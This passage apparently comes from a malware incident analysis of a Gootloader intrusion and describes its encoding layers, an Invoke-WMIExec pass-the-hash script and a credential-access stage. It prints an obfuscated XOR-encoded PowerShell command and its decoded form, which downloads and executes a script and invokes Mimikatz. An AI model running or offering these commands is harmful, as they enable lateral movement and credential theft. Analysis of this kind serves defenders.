x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x\n```\n\nThe second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.\n\n```image\nAlt: Base64 Encoded\nDescription: The image displays a lengthy encoded PowerShell script, likely used for malicious purposes in a cyber attack, illustrating the complexity of the encoding methods employed by the threat actor. The script is presented in a monospaced font, indicating it is code rather than regular text. The encoding seems to involve multiple layers, including Base64 and potentially other obfuscation techniques, and appears to be related to the execution of a WMIExec script for remote queries.\n```\n\nDecoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.\n\n```image\nAlt: WMIExec\nDescription: The image depicts a user interface for a decoding tool, showing an input section containing a Base64 encoded string that has been obfuscated. The output section displays the decoded PowerShell script named 'Invoke-WMIExec', which includes comments and parameters for executing WMI commands on target hosts using NTLMv2 for authentication. The layout suggests this is a practical demonstration of decoding a potentially malicious script related to cyber threats.\nTranscription: |\n  function Invoke-WMIExec\n  {\n  <#\n  .SYNOPSIS\n  Invoke-WMIExec performs WMI command execution on targets using NTLMv2 pass the hash authentication.\n  \n  Author: Kevin Robertson (@kevin_robertson)\n  License: BSD 3-Clause\n  \n  .PARAMETER Target\n  Hostname or IP address of target.\n  \n  .PARAMETER Username\n  Username to use for authentication.\n  \n  .PARAMETER Domain\n  Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username.\n  \n  .PARAMETER Hash\n  NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.\n  \n  .PARAMETER Command\n  Command to execute on the target. If a command is not specified, the function will just check to see if the username and hash has access to WMI on the target.\n  #>\n```\n\n## Credential Access\n\nThe malicious PowerShell process used by Gootloader dropped a PowerShell script named “mi.ps1” on the file system.\n\n```image\nAlt: mi.ps1\nDescription: The image displays a table documenting a file creation event related to a cybersecurity incident. It includes columns for 'Action Type', 'Folder Path', 'File Name', and 'Initiating Process Folder Path'. The 'Action Type' indicates 'FileCreated', the 'Folder Path' shows 'C:\\Users\\<redacted>', the 'File Name' is 'mi.ps1', and the 'Initiating Process Folder Path' is 'C:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe'. This data is relevant to tracking the activities of a malicious PowerShell script in the context of credential access.\nTranscription: |\n  Action Type      Folder Path      File Name   Initiating Process Folder Path\n  FileCreated      C:\\Users\\[redacted]   mi.ps1      c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\n```\n\nAnother PowerShell command was used to trigger the mi.ps1 script. The script was using XOR-encoding.\n\n```image\nAlt: XOR Encoding\nDescription: The image depicts a detailed output related to a PowerShell process creation event. It includes a command line that shows the execution of a PowerShell script with various parameters and encoded elements. The command appears to be part of a malicious activity, possibly related to credential access or exploitation. Key elements include the use of '-nop', '-noninteractive', and '-ep bypass' flags, along with a script block creation and a base64 encoded string that suggests obfuscation techniques typical in cyber threats.\nTranscription: |\n  TaskCategory          CommandLine\n  Process Create        powershell -nop -noni -ep bypass -w h -c \"$t=([type]'Convert');&([scriptblock]::Create(($t::(($t.GetMethods()|?{$_.Name -clike'F*g'}).Name)('PG01MD9wbGxoJjC3KSoVNjg2KDYpi1oqKi9Nz9kPMWWuUpVODxHMWUxIzxtZDAwX1tOVEFyTFVdMjEjOFFlaHdqbDVVd3xtdH04WyJETWt9amtEMYVIrcHk2dXdrdHlHRVxNmhrKSM4UXZud3N9NVVxdXFzelwx10DVbd3VobWx9a1Z5dX04XF1LU0xXSDVLSeXBTY8u'))%{$_-bxor24}|%{[char]$_})-join'')\"\n```\n\nThis CyberChef recipe can be used to decode the inner encoded command.\n\nThe output lists “Invoke-Mimikatz”, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.\n\n```\n$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&(GCM I*e-E*); Import-Module C:\\Users\\<redacted>\\mi.ps1; Invoke-Mimikatz -ComputerName <redacted>\n```\n\nMonitoring PowerShell event id 4103 we can observe the threat actor’s successful credential access activity from the Mimikatz invocation.\n\n```image\nAlt: 